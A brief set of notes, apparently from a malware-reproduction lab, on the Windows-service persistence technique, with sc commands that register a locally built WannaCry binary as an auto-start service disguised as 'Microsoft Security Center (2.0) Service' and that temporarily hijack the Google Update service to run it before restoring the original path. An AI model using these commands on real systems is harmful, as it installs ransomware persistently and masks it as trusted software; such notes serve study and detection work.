# Create or Modify System Process: Windows Service

https://github.com/microsoftarchive/msdn-code-gallery-microsoft/blob/master/OneCodeTeam/A%20basic%20Windows%20service%20in%20C++%20(CppWindowsService)/README.md


-------------------------------------------------------------------------------------------------------------------------------
sc create "mssecsvc2.0" DisplayName = "Microsoft Security Center (2.0) Service" binPath = "C:\Users\nigmaz\source\repos\WannaCry\x64\Release\WannaCry.exe" start = "auto"

sc start mssecsvc2.0
sc stop mssecsvc2.0
sc delete mssecsvc2.0

- sc config gupdate binPath= "C:\Users\nigmaz\source\repos\WannaCry\x64\Release\WannaCry.exe"
- sc start gupdate
- sc config gupdate binPath= "\"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe\" /svc" >nul 2>&1 
